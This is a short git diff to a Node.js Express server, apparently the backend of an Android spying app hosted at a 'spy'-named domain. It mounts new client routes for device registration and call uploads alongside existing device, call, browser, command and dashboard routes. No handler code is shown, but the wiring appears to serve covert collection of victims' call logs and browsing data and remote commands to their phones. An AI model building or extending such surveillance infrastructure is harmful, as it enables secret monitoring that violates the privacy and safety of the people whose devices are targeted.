@@ -96,6 +96,9 @@ const commandRoutes = require('./routes/commandRoutes');
 const authRoutes = require('./routes/authRoutes');
 const dashboardRoutes = require('./routes/dashboardRoutes');
 
+// ✅ IMPORT CLIENT ROUTES (Android app ke liye)
+const clientRoutes = require('./routes/client');
+
 // ========== USE ROUTES ==========
 app.use('/api', deviceRoutes);
 app.use('/api', callRoutes);
@@ -112,6 +115,9 @@ app.use('/api', browserRoutes);
 app.use('/api', commandRoutes);
 app.use('/api/auth', authRoutes);
 app.use('/api/data', dashboardRoutes);
+
+// ✅ MOUNT CLIENT ROUTES (so that /api/client/register, /api/client/calls etc work)
+app.use('/api/client', clientRoutes);
 
 // Health check
 app.get('/api/health', (req, res) => {
@@ -144,7 +150,7 @@ io.on('connection', (socket) => {
 // Start server
 const PORT = process.env.PORT || 5000;
 server.listen(PORT, '0.0.0.0', () => {
- console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`📡 Android API base: https://gauravhanna-spy.onrender.com/api/client`);
-  console.log(`📡 Dashboard API base: https://gauravhanna-spy.onrender.com/api/data`);
+  console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`📡 Android API base: https://guravhanna-spy.onrender.com/api/client`);
+  console.log(`📡 Dashboard API base: https://guravhanna-spy.onrender.com/api/data`);
 });
